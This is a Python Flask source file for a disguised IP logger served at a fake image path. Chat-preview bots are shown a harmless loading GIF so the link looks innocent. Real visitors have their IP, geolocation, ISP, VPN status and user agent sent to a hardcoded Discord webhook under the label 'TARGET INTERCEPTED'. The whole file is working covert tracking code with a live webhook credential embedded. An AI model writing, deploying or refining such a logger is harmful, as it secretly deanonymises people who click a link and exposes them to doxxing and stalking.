import os
import requests
from flask import Flask, request, redirect, send_file, render_template_string
import io
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"
GIF_URL = "https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    ua_low = ua.lower()
    
    # 1. THE DISCORD PREVIEW BOOSTER
    # This tells Discord to show the GIF inside the chat app
    if any(x in ua_low for x in ["discord", "telegram", "bot", "slack"]):
        html = f'''
        <html>
            <head>
                <meta property="og:type" content="video.other">
                <meta property="og:image" content="{GIF_URL}">
                <meta property="twitter:card" content="summary_large_image">
                <meta property="twitter:image" content="{GIF_URL}">
                <meta http-equiv="refresh" content="0;url={GIF_URL}">
            </head>
            <body></body>
        </html>
        '''
        return render_template_string(html)

    # 2. CORE DATA COLLECTION (The Logger)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ref = request.referrer or "System Default/Private"
    lang = request.accept_languages.best or "Unknown"
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")

    # Geolocation Lookup
    c, r, cntry, isp, org, asn, mob, vpn, host, tz = "??","??","??","??","??","??","??","??","??","??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if g['status'] == 'success':
            c, r, cntry, isp, org, asn, tz = g.get('city'), g.get('regionName'), g.get('country'), g.get('isp'), g.get('org'), g.get('as'), g.get('timezone')
            mob = "📱 Mobile" if g.get('mobile') else "💻 Desktop/WiFi"
            vpn = "🚨 DETECTED" if g.get('proxy') else "✅ Clean"
            host = "⚠️ DATA CENTER" if g.get('hosting') else "🏠 RESIDENTIAL"
    except: pass

    # 3. WEBHOOK PAYLOAD
    payload = {
        "username": "OMEGA-CORE INTERCEPT",
        "avatar_url": "https://i.imgur.com/8N76f9J.png",
        "embeds": [{
            "title": "⚡ TARGET INTERCEPTED",
            "description": f"**Ref:** `{ref}` | **Time:** `{time_utc}`",
            "color": 0x000000,
            "fields": [
                {"name": "📍 LOCATION", "value": f"```City: {c}\nCountry: {cntry}\nTZ: {tz}```", "inline": False},
                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}\n**Type:** {host}", "inline": False},
                {"name": "🧬 DEVICE", "value": f"**Type:** {mob}\n**IP:** `{ip}`", "inline": True},
                {"name": "📄 RAW UA", "value": f"```{ua}```", "inline": False}
            ],
            "footer": {"text": "Alpha v7.0 | Animation Active"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

    # 4. FINAL REDIRECT
    return redirect(GIF_URL)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
